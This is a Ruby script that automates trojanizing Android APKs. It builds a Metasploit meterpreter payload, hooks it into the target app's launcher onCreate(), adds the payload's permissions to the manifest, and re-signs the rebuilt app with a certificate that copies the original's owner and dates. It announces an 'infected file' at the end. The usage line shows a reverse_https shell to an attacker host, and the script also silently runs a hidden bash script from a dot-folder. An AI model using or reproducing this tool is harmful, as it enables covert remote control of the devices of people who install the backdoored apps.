#!/usr/bin/env ruby
# This script automatice the injections of metasploit payloads on arbitrary APKs.
# The APKs file have to be vulnerable without unicode files.

require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'
require 'date'
require 'active_support'

class String
  def black;          "\033[30m#{self}\033[0m" end
  def red;            "\033[31m#{self}\033[0m" end
  def green;          "\033[32m#{self}\033[0m" end
  def brown;          "\033[33m#{self}\033[0m" end
  def blue;           "\033[34m#{self}\033[0m" end
  def magenta;        "\033[35m#{self}\033[0m" end
  def cyan;           "\033[36m#{self}\033[0m" end
  def gray;           "\033[37m#{self}\033[0m" end
end

system('bash ${PWD}/.IbyC/embed')
keystore = "signing.keystore"
storepass = "android"
keypass = "android"
keyalias = "signing.key"

def print_status(msg='')
  $stderr.puts "[*]─➤ #{msg}".cyan
end

def print_error(msg='')
  $stderr.puts "[E]─➤ #{msg}".red," ╰[?]─➤ For help going to https://t.me/Ivam3_Bot".green
end

def run_cmd(cmd)
  begin
    stdin, stdout, stderr = Open3.popen3(*cmd)
    return stdout.read + stderr.read
  rescue Errno::ENOENT
    return nil
  end
end

def usage()
  print "[Usage]─➤ ".cyan,"embed [target.apk] [msfvenom options]\n"
  print "[ex]─➤ ".green,"embed anyapp.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
end
#
# Find the activity that apk_backdoor.rb is opened when you click the app icon
def findlauncheractivity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
          next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (activityname = `aapt dump badging $(pwd)/original.apk | awk '/activity/{gsub("name=|'"'"'",""); print $2}'`)
                activityname = activityname.to_s
                return activityname
            elsif (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end

#
# If XML parsing of the manifest fails,
# recursively search the smali code for the onCreate() hook.
def scrapeFilesForLauncherActivity()
    smali_files||=[]
    Dir.glob('original/smali*/**/*.smali') do |file|
      checkFile=File.read(file)
      if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
        smali_files << file
        smalifile = file
        activitysmali = checkFile
      end
    end
    i=0
    print_status "Please choose from one of the following:\n"
    smali_files.each{|s_file|
      print_status "Hook point ",i,": ",s_file,"\n".green
      i+=1
    }
    hook=-1
    while (hook < 0 || hook>i)
        print "\nHook: "
        hook = STDIN.gets.chomp.to_i
    end
    i=0
    smalifile=""
    activitysmali=""
    smali_files.each{|s_file|
      if (i==hook)
        checkFile=File.read(s_file)
        smalifile=s_file
        activitysmali = checkFile
        break
      end
      i+=1
    }
    return [smalifile,activitysmali]
end

def fix_manifest(minSDKv)
  payload_permissions=[]

  #Load payload's permissions
  File.open("payload/AndroidManifest.xml","r"){|file|
    k=File.read(file)
    payload_manifest=Nokogiri::XML(k)
    permissions = payload_manifest.xpath("//manifest/uses-permission")
    for permission in permissions
        name=permission.attribute("name")
        payload_permissions << name.to_s
    end
    # print "#{k}"
  }
  original_permissions=[]
  apk_mani=''

  #Load original apk's permissions
  File.open("original/AndroidManifest.xml","r"){|file2|
    k=File.read(file2)
    apk_mani=k
    original_manifest=Nokogiri::XML(k)
    permissions = original_manifest.xpath("//manifest/uses-permission")
    for permission in permissions
      name=permission.attribute("name")
      original_permissions << name.to_s
    end
    # print "#{k}"
  }
  ##
  #Get permissions that are not in original APK
  add_permissions=[]
  for permission in payload_permissions
    if !(original_permissions.include? permission)
      print "[+]─➤ Adding ".green,"#{permission}\n"
      add_permissions << permission
    end
  end
  inject=0
  new_mani=""
  #Inject permissions in original APK's manifest
  for line in apk_mani.split("\n")
    if (line.include? "uses-permission" and inject==0)
      `sed "s|minSdkVersion: '"[0-9][0-9]"'|minSdkVersion: '"#{minSDKv}"'|g" -i original/apktool.yml`
      new_mani << "\t\t"+'<uses-sdk android:minSdkVersion="'+minSDKv+'"/>'+"\n"
      for permission in add_permissions
        new_mani << "\t\t"+'<uses-permission android:name="'+permission+'"/>'+"\n"
      end
      new_mani << line+"\n"
      inject=1
    else
      new_mani << line+"\n"
    end
  end
  File.open("original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
end

def extract_cert_data_from_apk_file(path)
  orig_cert_data = []
  print_status("Get minimum SDK versiom from #{path}")
  # extract signing scheme v1 (JAR signing) certificate
  # v1 signing is optional to support older versions of Android (pre Android 11)
  # https://source.android.com/security/apksigning/
  print_status "Extract signing key and keystore from #{path}.."
  keytool_output = run_cmd(['keytool', '-J-Duser.language=en', '-printcert', '-jarfile', path])

  if keytool_output.include?('keytool error: ')
    raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
  end

  if keytool_output.start_with?('Not a signed jar file')
    # apk file does not have a valid v1 signing certificate
    # extract signing certificate from newer signing schemes (v2/v3/v4/...) using apksigner instead
    apksigner_output = run_cmd(['apksigner', 'verify', '--print-certs', path])

    cert_dname = apksigner_output.scan(/^Signer #\d+ certificate DN: (.+)$/).flatten.first.to_s.strip
    if cert_dname.blank?
      raise RuntimeError, "Could not extract signing certificate owner: #{apksigner_output}"
    end
    orig_cert_data.push(cert_dname)
    # Create random start date from some time in the past 3 years
    from_date = DateTime.now.next_day(-rand(3 * 365))
    orig_cert_data.push(from_date.strftime('%Y/%m/%d %T'))

    # Valid for 25 years
    # https://developer.android.com/studio/publish/app-signing
    to_date = from_date.next_year(25)
    validity = (to_date - from_date).to_i
    orig_cert_data.push(validity.to_s)
  else
    if keytool_output.include?('keytool error: ')
      raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
    end

    cert_dname = keytool_output.scan(/^Owner:(.+)$/).flatten.first.to_s.strip
    if cert_dname.blank?
      raise RuntimeError, "Could not extract signing certificate owner: #{keytool_output}"
    end
    orig_cert_data.push(cert_dname)

    valid_from_line = keytool_output.scan(/^Valid from:.+/).flatten.first
    if valid_from_line.empty?
      raise RuntimeError, "Could not extract certificate date: #{keytool_output}"
    end
    from_date_str = valid_from_line.gsub(/^Valid from:/, '').gsub(/until:.+/, '').strip
    to_date_str = valid_from_line.gsub(/^Valid from:.+until:/, '').strip
    from_date = DateTime.parse(from_date_str.to_s)
    orig_cert_data.push(from_date.strftime('%Y/%m/%d %T'))
    to_date = DateTime.parse(to_date_str.to_s)
    validity = (to_date - from_date).to_i
    orig_cert_data.push(validity.to_s)
  end

  if orig_cert_data.empty?
    raise RuntimeError, 'Could not extract signing certificate from APK file'
  end

  orig_cert_data
end

def gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
  orig_cert_data = extract_cert_data_from_apk_file(apkfile)
  orig_cert_dname = orig_cert_data[0]
  orig_cert_startdate = orig_cert_data[1]
  orig_cert_validity = orig_cert_data[2]

  print_status "Creating signing key and keystore.."
  keytool_output = run_cmd([
    'keytool', '-genkey', '-v', '-keystore', keystore, '-alias', keyalias, '-storepass', storepass,
    '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-startdate', orig_cert_startdate,
    '-validity', orig_cert_validity, '-dname', orig_cert_dname
  ])

  if keytool_output.include?('keytool error: ')
    raise RuntimeError, "keytool could not generate key: #{keytool_output}"
  end
end

def cleaning_up()
  toClean = ["data","original","payload","original.apk","payload.apk","signing.keystore","payload.apk.idsig"]
  for i in toClean do
    run_cmd(['rm', '-rf', i])
  end
end
####
# VALIDATING REQUIREMENTS && DEPENDENCIES
apkfile = ARGV[0]
get_minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F "x" '{print $NF}'`
minSDKv = get_minSDKv.to_s.gsub("\n", "")
current_working_directory = run_cmd(['pwd'])
cwd = current_working_directory.to_s
cwd = cwd.gsub("\n", "")
unless(apkfile && File.readable?(apkfile))
  usage()
  exit(1)
end

pkgs = ["jarsigner", "apktool", "zipalign", "java", "apksigner","aapt","keytool","msfvenom"]
for pkg in pkgs do
  unless(run_cmd([pkg]))
    print_error("#{pkg} is not in PATH, please install it")
    exit(1)
  end
end

begin
  msfvenom_opts = ARGV[1,ARGV.length]
  opts=""
  msfvenom_opts.each{|x|
    opts+=x
    opts+=" "
  }
rescue
  usage()
  print_error("Error parsing msfvenom options.")
  exit(1)
end

# Set signer key file || default was maded on nov/2022 with android debugging parameters
cleaning_up()
print "[?]─➤ Set a keystore signer\n ╰{1}─➤ ".cyan,"Using the original apk credentials\n ","╰{2}─➤ ".cyan,"Using your own key\n ","╰{3}─➤ ".cyan,"Create a new key\n ","╰────➤ ".cyan
answ = $stdin.gets.to_i
if answ<=3 and answ>0
  case answ
  when 2
    print " ╰[Key-path]─➤ ".cyan
    jksfile = $stdin.gets.chomp.to_s
    if File.exist?("#{jksfile}")
      run_cmd(['cp', jksfile, "#{cwd}/key.jks"])
    else
      puts " ╰[ERR-not_found]─➤ Aborting".red
      exit(1)
    end
  when 3
    run_cmd([
      "keytool", "-genkey", "-v", "-keystore", "userkey.jks", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-alias", keyalias
    ])
    FileUtils.cp("userkey.jks",keystore)
  else
    gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
  end
else
  puts " ╰[ERR-bad_answer]─➤ Aborting.".red
  exit(1)
end

print_status("Generating msfvenom payload..")
res=`msfvenom -f raw #{opts} -o payload.apk 2>&1`
if res.downcase.include?("invalid" || "error")
  puts res
  exit(1)
end

print_status("Signing payload..")
payload_signed = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", "#{cwd}/payload.apk"])
run_cmd(["cp", apkfile, "#{cwd}/original.apk"])
print_status("Decompiling orignal APK..")
run_cmd(["apktool", "d", "-r", "-f", "-o", "#{cwd}/original", "#{cwd}/original.apk"])
print_status("Ignoring the resource decompilation..")
run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
FileUtils.rm_rf('original/AndroidManifest.xml')
FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
FileUtils.rm_rf('original_tmp')
print_status("Decompiling payload APK..")
run_cmd(['apktool', 'd', '-f', '-o', "#{cwd}/payload", "#{cwd}/payload.apk"])

f = File.open("original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

print_status("Locating onCreate() hook..")
launcheractivity = findlauncheractivity(amanifest)
#smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
smalif = Dir["original/**/" + launcheractivity.gsub(/\./, "/").gsub("\n", ".smali")]
smalif = smalif.to_s
smalifile = smalif.gsub("[", "").gsub("]", "").gsub("\"", "")

begin
  activitysmali = File.read(smalifile.to_s)
rescue Errno::ENOENT
  puts "[W]─➤ Unable to find correct hook automatically".blue
  begin
    results=scrapeFilesForLauncherActivity()
    smalifile=results[0]
    activitysmali=results[1]
  rescue
    cleaning_up()
    print_error("Couldn't find launcher activity..")
    exit(1)
  end
end

print_status("Copying payload files..")
FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage'
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)

print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
File.open(smalifile, "w") {|file| file.puts hookedsmali }
injected_apk=apkfile.split(".")[0]
injected_apk = "data/data/com_backdoored.apk"
final_apk=apkfile.split("/")[-1]
final_apk+="_final"

print_status("Poisoning the manifest with meterpreter permissions..")
fix_manifest(minSDKv)

print_status("Rebuilding #{apkfile}\n      with meterpreter injection as #{injected_apk}..")
for i in (1..3) do
  apktool_output = run_cmd(['apktool', 'b', '-f', '--use-aapt2', '-o', "#{cwd}/#{injected_apk}", "#{cwd}/original", "2>&1"])
  if !apktool_output.to_s.include?(injected_apk)
    print_error(apktool_output)
    cleaning_up()
    raise RuntimeError, "Unable to rebuild.. Retrying[#{i}].."
  else
    break
  end
end

print_status("Aligning #{injected_apk}..")
zipalign_output = run_cmd(['zipalign', '-f', '-v', '4', injected_apk, final_apk])

unless File.readable?(final_apk)
  print_error(zipalign_output)
  cleaning_up()
  raise RuntimeError, 'Unable to align apk with zipalign.'
  exit(1)
end

print_status("Signing #{final_apk} with apksigner..")
apksigner_output = run_cmd([
  'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", '--min-sdk-version', "#{minSDKv}", final_apk, "2>&1"
])
if apksigner_output.to_s.include?('Failed')
  print_error(apksigner_output)
  cleaning_up()
  raise RuntimeError, 'Signing with apksigner failed.'
  exit(1)
end

apksigner_verify = run_cmd(['apksigner', 'verify', '--verbose', final_apk])
if apksigner_verify.to_s.include?('DOES NOT VERIFY') || apksigner_verify.to_s.include?('Failed')
  print_error(apksigner_verify)
  cleaning_up()
  raise RuntimeError, 'Signature verification failed.'
  exit(1)
else
  print "[DONE]─➤ Infected file is ready in: ".green,"#{cwd}/#{final_apk}."
end
